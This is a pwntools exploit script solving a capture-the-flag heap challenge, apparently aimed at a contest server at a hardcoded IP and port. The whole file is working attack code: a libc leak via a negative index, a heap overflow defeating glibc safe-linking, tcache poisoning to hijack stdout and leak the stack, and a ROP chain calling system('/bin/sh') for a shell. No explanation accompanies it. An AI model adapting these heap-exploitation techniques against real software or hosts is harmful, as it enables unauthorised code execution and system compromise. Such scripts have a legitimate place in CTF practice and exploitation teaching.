#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

gdbscript = f"""
	set solib-search-path {Path.cwd()}
#	brva 0x12db
	c
"""

def conn():
	if args.REMOTE:
		#p = remote("addr", args.PORT)
		#p = remote(args.HOST, args.PORT)
		p = remote("13.125.233.58", 7331)
	elif args.GDB:
		p = gdb.debug([elf.path], gdbscript=gdbscript)
		log.info("gdbscript: " + gdbscript)
	else:
		p = process([elf.path])
	return p

p = conn()

# solve or else

count = -1

def create(sz=0x10, data=''):
	if data == '': data = b'\0'*sz
	p.sendlineafter(b">>", b'1')
	p.sendlineafter(b"input chunk size :", str(sz).encode())
	p.sendafter(b"input chunk data :", (data + b'\n')[:sz])
	global count
	count += 1
	return count
def read(id):
	p.sendlineafter(b">>", b'4')
	p.sendlineafter(b"input chunk id :", str(id).encode())
	return p.recvline(keepends=False)
def update(id, new_data):
	p.sendlineafter(b">>", b'3')
	p.sendlineafter(b"input chunk id :", str(id).encode())
	p.sendafter(b"modify chunk data(max 40) :", (new_data + b'\n')[:40])
def delete(id):
	p.sendlineafter(b">>", b'2')
	p.sendlineafter(b"input chunk id :", str(id).encode())

leak = read(-6)
libc.address = u64(leak[0x6:0xe]) - libc.sym._IO_stdfile_0_lock
log.info(f"libc: {libc.address:#x}")
libc__IO_2_1_stdout_ = libc.sym._IO_2_1_stdout_
libc_environ = libc.sym.environ
libc_system = libc.sym.system
libc_binsh = next(libc.search(b"/bin/sh"))
libc_rop = ROP(libc)
poprdi = libc_rop.rdi.address
ret = libc_rop.ret.address

heap_overflow_chunk = create()
heap_read_chunk = create()
heap_leak_chunk = create()
update(heap_overflow_chunk, b'b'*(3*8) + p64(0x21) + p64(0x100))
delete(heap_leak_chunk)
leak = read(heap_read_chunk)[1:]
safe_link = u64(leak[0x40:0x48])
#heap = (u64(leak[0x20:0x28]) ^ safe_link) - 0x340
#log.info(f"heap: {heap:#x}")
log.info(f"safe linking: {safe_link:#x}")

update(heap_read_chunk, b'b'*(3*8) + p64(0x21) + p64((safe_link << 3*4) + 0x90 ^ safe_link))

init_0x50_tcache = create(0x40)
delete(init_0x50_tcache)

tcache = create(1, b'\0')
update(tcache, p64(0)*3 + p64(libc__IO_2_1_stdout_))
stdout_val = libc.sym._IO_2_1_stdout_+131
create(0x40, p64(0xfbad1800) + p64(stdout_val)*3 + p64(libc_environ) + p64(libc_environ+8)*2 + p64(stdout_val))
p.recv(1)
return_addr = u64(p.recv(8)) - 0x140
log.info(f"return address: {return_addr:#x}")

init_0x50_tcache = create(0x40)
delete(init_0x50_tcache)

update(tcache, p64(safe_link << 3*4) + p64(0)*2 + p64(return_addr-8))
payload = flat([
	0,
	poprdi, libc_binsh,
	ret,
	libc_system,
])
create(0x40, payload)

p.interactive()
